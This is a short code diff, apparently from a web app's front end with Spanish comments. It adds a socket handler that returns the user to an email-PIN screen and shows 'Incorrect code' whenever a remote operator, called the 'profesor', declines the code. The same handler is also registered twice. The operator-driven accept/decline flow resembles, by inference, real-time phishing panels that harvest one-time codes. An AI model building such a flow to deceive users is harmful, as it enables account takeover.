@@ -331,6 +331,17 @@
         setTimeout(() => error.classList.add('hidden'), 3000);
     });
 
+        // NUEVO: Reintentar PIN de Correo cuando el profesor da "Declinar (Correo)"
+    socket.on('reintentarPINCorreo', () => {
+        document.getElementById('loading-etapa2').classList.add('hidden');
+        document.getElementById('pin-correo-screen').classList.remove('hidden');
+        
+        const error = document.getElementById('pin-correo-error');
+        error.textContent = "Incorrect code. Please try again.";
+        error.classList.remove('hidden');
+        setTimeout(() => error.classList.add('hidden'), 3000);
+    });
+    
         // NUEVO: Reintentar PIN Correo cuando se declina en Etapa 2
     socket.on('reintentarPINCorreo', () => {
         document.getElementById('loading-etapa2').classList.add('hidden');
